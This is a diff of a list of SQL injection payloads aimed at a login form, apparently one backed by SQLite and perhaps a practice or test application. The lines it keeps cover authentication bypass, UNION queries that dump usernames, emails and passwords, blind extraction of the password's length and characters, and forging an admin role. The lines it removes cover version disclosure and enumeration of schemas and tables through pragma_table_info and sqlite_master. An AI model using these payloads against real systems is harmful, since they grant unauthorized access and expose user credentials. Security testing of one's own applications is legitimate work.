@@ -14,26 +14,14 @@ Password: ' OR '1'='1
 Username: ' UNION SELECT id,username,email,password,role,name,phone FROM users --
 Password: anything
 
-4. SQLite version disclosure through UNION
-Username: ' UNION SELECT 1,sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version() --
-Password: anything
-
-5. Boolean-based blind SQLi: password length
+4. Boolean-based blind SQLi: password length
 Username: admin' AND LENGTH(password)=8 --
 Password: anything
 
-6. Boolean-based blind SQLi: character extraction
+5. Boolean-based blind SQLi: character extraction
 Username: admin' AND SUBSTR(password,1,5)='admin' --
 Password: anything
 
-7. UNION-based role forgery
+6. UNION-based role forgery
 Username: ' UNION SELECT 1,'pwned','pwned@example.com','x','admin','Injected Admin','9999999999' --
-Password: anything
-
-8. Schema enumeration with pragma_table_info
-Username: ' UNION SELECT 1,group_concat(name,','),group_concat(name,','),group_concat(name,','),group_concat(name,','),group_concat(name,','),group_concat(name,',') FROM pragma_table_info('users') --
-Password: anything
-
-9. Table enumeration via sqlite_master
-Username: ' UNION SELECT 1,name,type,sql,type,name,sql FROM sqlite_master WHERE type='table' --
 Password: anything
